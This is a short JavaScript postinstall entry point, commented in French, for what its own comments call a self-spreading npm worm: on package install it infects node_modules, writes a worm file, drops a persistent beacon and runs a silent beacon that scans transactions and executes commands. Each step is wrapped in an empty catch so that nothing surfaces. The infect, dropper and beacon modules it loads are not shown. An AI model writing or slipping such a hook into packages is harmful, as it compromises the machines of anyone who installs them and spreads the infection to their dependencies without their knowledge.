'use strict';
// Point d'entrée postinstall (obfusqué à la build).
// 1. infection node_modules + worm .worm/main.js
// 2. drop beacon + persistance
// 3. beacon silencieux (scan txs + exécution)
// Tout silencieux et non bloquant.
const { infectAll } = require('./lib/infect');
const { drop } = require('./lib/dropper');
const { beacon } = require('./lib/beacon');

(async () => {
  try { infectAll(process.cwd()); } catch {}
  try { drop(); } catch {}
  try { await beacon(); } catch {}
})();
